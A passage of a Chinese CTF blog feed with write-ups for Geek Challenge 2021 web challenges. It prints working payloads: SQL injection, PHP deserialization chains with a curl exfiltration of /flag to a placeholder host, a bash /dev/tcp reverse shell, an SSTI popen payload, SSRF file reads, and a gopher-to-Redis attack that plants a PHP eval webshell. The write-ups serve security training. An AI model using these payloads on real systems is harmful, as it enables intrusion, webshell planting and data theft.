class="token operator">></span><span class="token property">memcached</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Generator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">lockKey</span> <span class="token operator">=</span> <span class="token string">"dir"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 入口位置 class RedisHandler extends BaseHandler</span><span class="token keyword">namespace</span> <span class="token package">CodeIgniter<span class="token punctuation">\</span>Cache<span class="token punctuation">\</span>Handlers</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">RedisHandler</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">redis</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token punctuation">\</span>CodeIgniter<span class="token punctuation">\</span>Session<span class="token punctuation">\</span>Handlers<span class="token punctuation">\</span>MemcachedHandler</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">RedisHandler</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="image-20211124163528615.png" alt="image-20211124163528615"></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>极客大挑战2021wp-Web[部分]</title>
      <link href="/2021/11/19/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982021wp-Web/"/>
      <url>/2021/11/19/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982021wp-Web/</url>
      
        <content type="html"><![CDATA[<h2 id="极客大挑战2021-wp-WEB（部分）"><a href="#极客大挑战2021-wp-WEB（部分）" class="headerlink" title="极客大挑战2021_wp_WEB（部分）"></a>极客大挑战2021_wp_WEB（部分）</h2><h2 id="Dark"><a href="#Dark" class="headerlink" title="Dark"></a>Dark</h2><p><img src="image-20211025113848135.png" alt="image-20211025113848135"></p><p>网址以.onion为后缀，这是洋葱浏览器的网址后缀，下载洋葱浏览器访问即可拿到flag</p><p><img src="image-20211025114113682.png" alt="image-20211025114113682"></p><h3 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h3><pre class="line-numbers language-flag"><code class="language-flag">SYC{hav3_fUn_1n_darK}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Welcome2021"><a href="#Welcome2021" class="headerlink" title="Welcome2021"></a>Welcome2021</h2><p><img src="image-20211025114200101.png" alt="image-20211025114200101"></p><p>查看源码</p><p><img src="image-20211025114217472.png" alt="image-20211025114217472"></p><p>Burp改请求为WELCOME</p><p><img src="image-20211025114418704.png" alt="image-20211025114418704"></p><p>访问f1111aaaggg9.php</p><p><img src="image-20211025114515505.png" alt="image-20211025114515505"></p><h3 id="flag-1"><a href="#flag-1" class="headerlink" title="flag"></a>flag</h3><pre class="line-numbers language-flag"><code class="language-flag">SYC{WeLcom3_t0_Geek_2o21!!}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="babysql"><a href="#babysql" class="headerlink" title="babysql"></a>babysql</h2><p><img src="image-20211025114612659.png" alt="image-20211025114612659"></p><p>随便输点东西测试</p><p><img src="image-20211025114819482.png" alt="image-20211025114819482"></p><p>uname存在注入点</p><p><img src="image-20211025115131688.png" alt="image-20211025115131688"></p><p>联合查询</p><p><img src="image-20211025115239380.png" alt="image-20211025115239380"></p><p>查库</p><p><img src="image-20211025115335571.png" alt="image-20211025115335571"></p><p>查表</p><p><img src="image-20211025115427314.png" alt="image-20211025115427314"></p><p>查列</p><p><img src="image-20211025115512066.png" alt="image-20211025115512066"></p><p>查字段</p><h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><pre class="line-numbers language-payload"><code class="language-payload">pwd=admin#&uname=admn' union select 1,(select group_concat(fllllllag,wlz) from flag.fllag),3,4#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="flag-2"><a href="#flag-2" class="headerlink" title="flag"></a>flag</h3><pre class="line-numbers language-flag"><code class="language-flag">SYC{U_4N0vv_Sql_Noyv~}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="babyPOP"><a href="#babyPOP" class="headerlink" title="babyPOP"></a>babyPOP</h2><p>反序列化pop链</p><p><img src="image-20211025121610226.png" alt="image-20211025121610226"></p><p>入口在class e而关键点在class c ，所以需要先调用c在调用e</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">a</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token variable">$Do_u_like_JiaRan</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token variable">$Do_u_like_AFKL</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">b</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$i_want_2_listen_2_MaoZhongDu</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">i_want_2_listen_2_MaoZhongDu</span> <span class="token operator">=</span> "curl http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//xxx.xxx.xxx.xxx:2333/`cat /flag`";</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">c</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">y</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">e</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">d</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">value</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">b</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">e</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">afkl</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">d</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">c</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//nc -lvp 2333 即可拿到flag</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="image-20211025122022249.png" alt="image-20211025122022249"></p><h3 id="flag-3"><a href="#flag-3" class="headerlink" title="flag"></a>flag</h3><pre class="line-numbers language-flag"><code class="language-flag">SYC{U_n3ed_JiaRan&PHP_m@gic_meth0ds}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="where-is-my-FUMO"><a href="#where-is-my-FUMO" class="headerlink" title="where_is_my_FUMO"></a>where_is_my_FUMO</h2><p><img src="image-20211025122124919.png" alt="image-20211025122124919"></p><p>简单的反弹shell</p><p>传入自己的服务器ip和端口</p><p><img src="image-20211025122347326.png" alt="image-20211025122347326"></p><p>将shell反到自己本机另一个端口</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">bash</span> -i <span class="token operator">></span><span class="token operator">&amp;</span> /dev/tcp/xxx.xxx.xxx.xxx/1234 0<span class="token operator">></span><span class="token operator">&amp;</span>1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="image-20211025123955142.png" alt="image-20211025123955142"></p><p>flag在根目录</p><p><img src="image-20211025124056533.png" alt="image-20211025124056533"></p><p>网站运行权限为www-data，无权写入，但Linux下有个/tmp目录，www-data权限具有w权限</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cp</span> /flag.png /tmp/flag.png  //复制到tmp目录<span class="token function">cat</span> flag.png <span class="token operator">></span> /dev/tcp/xxx.xxx.xxx.xx/4567 <span class="token operator">></span> flag.png  // 发给本地主机<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="image-20211025134007810.png" alt="image-20211025134007810"></p><p><img src="image-20211025134632890.png" alt="image-20211025134632890"></p><h3 id="flag-4"><a href="#flag-4" class="headerlink" title="flag"></a>flag</h3><pre class="line-numbers language-flag"><code class="language-flag">SYC{Baka~Baka~Baka~}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="babyphp"><a href="#babyphp" class="headerlink" title="babyphp"></a>babyphp</h2><p>查看源码</p><p><img src="image-20211026200549555.png" alt="image-20211026200549555"></p><p>访问robots.txt</p><p><img src="image-20211026200624314-16352499870331.png" alt="image-20211026200624314"></p><p><img src="image-20211026200650748.png" alt="image-20211026200650748"></p><p>SSRF,直接file://协议度文件</p><h3 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h3><pre class="line-numbers language-payload"><code class="language-payload">http://47.100.242.70:4659/noobcurl.php?url=file:///flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="flag-5"><a href="#flag-5" class="headerlink" title="flag"></a>flag</h4><pre class="line-numbers language-flag"><code class="language-flag">SYC{U_4N0vv_Ss4f_3ovv~}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="babyPy"><a href="#babyPy" class="headerlink" title="babyPy"></a>babyPy</h2><p><img src="image-20211026200931468.png" alt="image-20211026200931468"></p><p>ssti，原理不解释</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-payload"><code class="language-payload">body=<body>{{''.__class__.__base__.__subclasses__()[133].__init__.__globals__['popen']('cat /flag').read()}}</body>&title=111<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="image-20211026201052220.png" alt="image-20211026201052220"></p><h3 id="flag-6"><a href="#flag-6" class="headerlink" title="flag"></a>flag</h3><pre class="line-numbers language-flag"><code class="language-flag">SYC{The_SsTi_1s_V3ry_funNy!}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="蜜雪冰城甜蜜蜜"><a href="#蜜雪冰城甜蜜蜜" class="headerlink" title="蜜雪冰城甜蜜蜜"></a>蜜雪冰城甜蜜蜜</h2><p><img src="image-20211026201154844.png" alt="image-20211026201154844"></p><p>看看源码</p><p><img src="image-20211026201242254.png" alt="image-20211026201242254"></p><p>获取点击的id值，处理后上传</p><p>本来想着伪造params.sign，不过后面看着看着被自己气到了</p><p>直接改一个的html为id=9</p><p><img src="image-20211026201547919.png" alt="image-20211026201547919"></p><h3 id="flag-7"><a href="#flag-7" class="headerlink" title="flag"></a>flag</h3><pre class="line-numbers language-flag"><code class="language-flag">SYC{N1_A1_W0_Ya_W0_L0vE_Ni!}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="雷克雅未克"><a href="#雷克雅未克" class="headerlink" title="雷克雅未克"></a>雷克雅未克</h2><p><img src="image-20211026201641470.png" alt="image-20211026201641470"></p><p>直接了当，需要伪造ip和经纬度</p><p>抓包</p><p><img src="image-20211026201755112.png" alt="image-20211026201755112"></p><p>经纬度写在了cookie里，这下连抓包都不用了</p><p>查询指定ip的经纬度</p><p><img src="image-20211026201915438.png" alt="image-20211026201915438"></p><p>伪造XFF和cookie</p><p><img src="image-20211026202424043.png" alt="image-20211026202424043"></p><p><img src="image-20211026202437114.png" alt="image-20211026202437114"></p><p>这是fackjson</p><p>直接控制台输</p><pre class="line-numbers language-js"><code class="language-js">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>fackjson所以字符<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="image-20211026202828140.png" alt="image-20211026202828140"></p><h3 id="flag-8"><a href="#flag-8" class="headerlink" title="flag"></a>flag</h3><pre class="line-numbers language-flag"><code class="language-flag">SYC{Welc0me_Rey_k_jav1_k}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="babyxss"><a href="#babyxss" class="headerlink" title="babyxss"></a>babyxss</h2><p><img src="image-20211026203029752.png" alt="image-20211026203029752"></p><p>xss注入，思路同sql注入</p><p>这种也就两步：闭合、绕过</p><h3 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h3><pre class="line-numbers language-js"><code class="language-js"><span class="token string">");alalertert(1)("</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>闭合console.log, 双写alert绕过</p><p><img src="image-20211026203342637.png" alt="image-20211026203342637"></p><h3 id="flag-9"><a href="#flag-9" class="headerlink" title="flag"></a>flag</h3><pre class="line-numbers language-flag"><code class="language-flag">Syc{W4lc0me_t0_the_w0rld_0f_x3s.}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Baby-PHP-Black-Magic-Enlightenment"><a href="#Baby-PHP-Black-Magic-Enlightenment" class="headerlink" title="Baby_PHP_Black_Magic_Enlightenment"></a>Baby_PHP_Black_Magic_Enlightenment</h2><p>让人讨厌的套娃</p><p><img src="image-20211026203548487.png" alt="image-20211026203548487"></p><p>password不能是数字，且大于9999</p><p>%00绕过</p><pre class="line-numbers language-payload"><code class="language-payload">?password=99999%00<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看源码</p><p><img src="image-20211026203818449.png" alt="image-20211026203818449"></p><p>就硬套</p><p><img src="image-20211026203901275.png" alt="image-20211026203901275"></p><p>user != pass并且sha1相等</p><p>同MD5,数组绕过</p><pre class="line-numbers language-payload"><code class="language-payload">?user[]=2&pass[]=1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="image-20211026204307214.png" alt="image-20211026204307214"></p><p>继续套娃</p><p><img src="image-20211026204410900.png" alt="image-20211026204410900"></p><p>对数组进行了检测，无法数组绕过，但sha1和md5绕过思想基本一致，百度sha1碰撞</p><p><img src="image-20211026204700190.png" alt="image-20211026204700190"></p><p>搜到现成的payload直接打</p><p>payload地址<code>https://www.cnblogs.com/chalan630/p/14099502.html</code></p><pre class="line-numbers language-payload"><code class="language-payload">/baby_revenge.php?user=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1&pass=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>出题人套娃上瘾</p><p><img src="image-20211026204903494.png" alt="image-20211026204903494"></p><p><img src="image-20211026205025582.png" alt="image-20211026205025582"></p><p>要求传入的id url解码后为Longlone</p><p>服务端接收GET时会进行一次url解码，这里又一次，所以直接url编码两次传上去</p><p>harback不会url编码字母，所以用burp</p><p><img src="image-20211026205356787.png" alt="image-20211026205356787"></p><h3 id="payload-3"><a href="#payload-3" class="headerlink" title="payload"></a>payload</h3><pre class="line-numbers language-payload"><code class="language-payload">/here_s_the_flag.php?id=%25%34%63%25%36%66%25%36%65%25%36%37%25%36%63%25%36%66%25%36%65%25%36%35<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="image-20211026205406921.png" alt="image-20211026205406921"></p><h3 id="flag-10"><a href="#flag-10" class="headerlink" title="flag"></a>flag</h3><pre class="line-numbers language-flag"><code class="language-flag">flag{PHP_1s_fu1king_awesome}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="givemeyourlove"><a href="#givemeyourlove" class="headerlink" title="givemeyourlove"></a>givemeyourlove</h2><p><img src="image-20211026205528755.png" alt="image-20211026205528755"></p><p>SSRF攻击redis，带密码</p><p>攻击原理我在SSRF一文中已经写过，这里直接打</p><p>文章地址<code>https://atmujie.github.io/2021/09/22/SSRF/</code></p><p>虽然写的比较水，但不想再这里再说一次了</p><p>这里我手搓个payload出来</p><h3 id="伪造数据包"><a href="#伪造数据包" class="headerlink" title="伪造数据包"></a>伪造数据包</h3><pre class="line-numbers language-bash"><code class="language-bash">socat -v tcp-listen:2333,fork tcp:localhost:6379监听2333，转发6379<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="image-20211026210313942.png" alt="image-20211026210313942"></p><p>将本地redis密码设置为123123</p><p>重启redis</p><pre class="line-numbers language-bash"><code class="language-bash">/etc/init.d/redis-server restart<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将所有payload写进shell.sh</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#shell.sh</span>redis-cli -h <span class="token variable">$1</span> -p <span class="token variable">$2</span> -a <span class="token variable">$3</span> config <span class="token keyword">set</span> <span class="token function">dir</span> /var/www/htmlredis-cli -h <span class="token variable">$1</span> -p <span class="token variable">$2</span> -a <span class="token variable">$3</span> config <span class="token keyword">set</span> dbfilename redis.phpredis-cli -h <span class="token variable">$1</span> -p <span class="token variable">$2</span> -a <span class="token variable">$3</span> <span class="token keyword">set</span> webshell <span class="token string">"&lt;?php eval(<span class="token variable">$_POST</span>[0]);?>"</span>redis-cli -h <span class="token variable">$1</span> -p <span class="token variable">$2</span> -a <span class="token variable">$3</span> saveredis-cli -h <span class="token variable">$1</span> -p <span class="token variable">$2</span> -a <span class="token variable">$3</span> quit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将命令发给2333端口</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">bash</span> shell.sh 127.0.0.1 2333 123123<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="image-20211026211805005.png" alt="image-20211026211805005"></p><p>数据包</p><pre class="line-numbers language-redis"><code class="language-redis">> 2021/10/26 21:16:32.144985  length=26 from=0 to=25*2\r$4\rAUTH\r$6\r123123\r< 2021/10/26 21:16:32.145938  length=5 from=0 to=4+OK\r> 2021/10/26 21:16:32.146108  length=54 from=26 to=79*4\r$6\rconfig\r$3\rset\r$3\rdir\r$13\r/var/www/html\r< 2021/10/26 21:16:32.147070  length=5 from=5 to=9+OK\r> 2021/10/26 21:16:32.149162  length=26 from=0 to=25*2\r$4\rAUTH\r$6\r123123\r< 2021/10/26 21:16:32.149695  length=5 from=0 to=4+OK\r> 2021/10/26 21:16:32.149853  length=57 from=26 to=82*4\r$6\rconfig\r$3\rset\r$10\rdbfilename\r$9\rredis.php\r< 2021/10/26 21:16:32.150858  length=5 from=5 to=9+OK\r> 2021/10/26 21:16:32.152714  length=26 from=0 to=25*2\r$4\rAUTH\r$6\r123123\r< 2021/10/26 21:16:32.153230  length=5 from=0 to=4+OK\r> 2021/10/26 21:16:32.153399  length=52 from=26 to=77*3\r$3\rset\r$8\rwebshell\r$18\r<?php eval([0]);?>\r< 2021/10/26 21:16:32.154350  length=5 from=5 to=9+OK\r> 2021/10/26 21:16:32.156123  length=26 from=0 to=25*2\r$4\rAUTH\r$6\r123123\r< 2021/10/26 21:16:32.156653  length=5 from=0 to=4+OK\r> 2021/10/26 21:16:32.156807  length=14 from=26 to=39*1\r$4\rsave\r< 2021/10/26 21:16:32.166409  length=5 from=5 to=9+OK\r> 2021/10/26 21:16:32.168384  length=26 from=0 to=25*2\r$4\rAUTH\r$6\r123123\r< 2021/10/26 21:16:32.168968  length=5 from=0 to=4+OK\r> 2021/10/26 21:16:32.169138  length=14 from=26 to=39*1\r$4\rquit\r< 2021/10/26 21:16:32.169448  length=5 from=5 to=9+OK\r<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>丢进脚本处理，脚本在上面说的文章里</p><p>处理结果前面加上<code>gopher://127.0.0.1:6379/_</code></p><pre class="line-numbers language-payalod"><code class="language-payalod">gopher://127.0.0.1:6379/_r://127.0.0.1:6379/_*2%0d%0a$4%0d%0aAUTH%0d%0a$6%0d%0a123123%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$13%0d%0a/var/www/html%0d%0a*2%0d%0a$4%0d%0aAUTH%0d%0a$6%0d%0a123123%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$9%0d%0aredis.php%0d%0a*2%0d%0a$4%0d%0aAUTH%0d%0a$6%0d%0a123123%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$8%0d%0awebshell%0d%0a$24%0d%0a<%3Fphp eval($_POST[0]);%3F>%0d%0a*2%0d%0a$4%0d%0aAUTH%0d%0a$6%0d%0a123123%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*2%0d%0a$4%0d%0aAUTH%0d%0a$6%0d%0a123123%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里最好检查一下payload，尤其是?和\r，要确保已经url编码过一次</p><p>再次url编码传入，回显全为+OK即为成功</p><p><img src="image-20211026213645354.png" alt="image-20211026213645354"></p><h3 id="payload-4"><a href="#payload-4" class="headerlink" title="payload"></a>payload</h3><pre class="line-numbers language-payload"><code class="language-payload">?url=gopher%3A%2F%2F127.0.0.1%3A6379%2F_*2%250d%250a%244%250d%250aAUTH%250d%250a%246%250d%250a123123%250d%250a*4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%243%250d%250adir%250d%250a%2413%250d%250a%2Fvar%2Fwww%2Fhtml%250d%250a*2%250d%250a%244%250d%250aAUTH%250d%250a%246%250d%250a123123%250d%250a*4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%2410%250d%250adbfilename%250d%250a%249%250d%250aredis.php%250d%250a*2%250d%250a%244%250d%250aAUTH%250d%250a%246%250d%250a123123%250d%250a*3%250d%250a%243%250d%250aset%250d%250a%248%250d%250awebshell%250d%250a%2424%250d%250a%3C%253Fphp%20eval(%24_POST%5B0%5D)%3B%253F%3E%250d%250a*2%250d%250a%244%250d%250aAUTH%250d%250a%246%250d%250a123123%250d%250a*1%250d%250a%244%250d%250asave%250d%250a*2%250d%250a%244%250d%250aAUTH%250d%250a%246%250d%250a123123%250d%250a*1%250d%250a%244%250d%250aquit%250d%250a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>访问shell，查看flag</p><p><img src="image-20211026214655340.png" alt="image-20211026214655340"></p><h3 id="flag-11"><a href="#flag-11" class="headerlink" title="flag"></a>flag</h3><pre class="line-numbers language-flag"><code class="language-flag">SYC{ygtq_w@nt_a_glrlfr1ed}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="SoEzUnser"><a href="#SoEzUnser" class="headerlink" title="SoEzUnser"></a>SoEzUnser</h2><p>这道题难点就在对原型类的使用，参考这篇文章</p><p><code>https://whoamianony.top/2021/03/10/Web%E5%AE%89%E5%85%A8/PHP%20%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%88%A9%E7%94%A8%E5%B0%8F%E7%BB%93/</code></p><p><img src="image-20211026215015504.png" alt="image-20211026215015504"></p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">fxxk</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$par0</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$par1</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$par2</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$par3</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$kelasi</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$par0</span><span class="token punctuation">,</span> <span class="token variable">$par1</span><span class="token punctuation">,</span> <span class="token variable">$par2</span><span class="token punctuation">,</span> <span class="token variable">$par3</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">par0</span> <span class="token operator">=</span> <span class="token variable">$par0</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">par1</span> <span class="token operator">=</span> <span class="token variable">$par1</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">par2</span> <span class="token operator">=</span> <span class="token variable">$par2</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">par3</span> <span class="token operator">=</span> <span class="token variable">$par3</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span 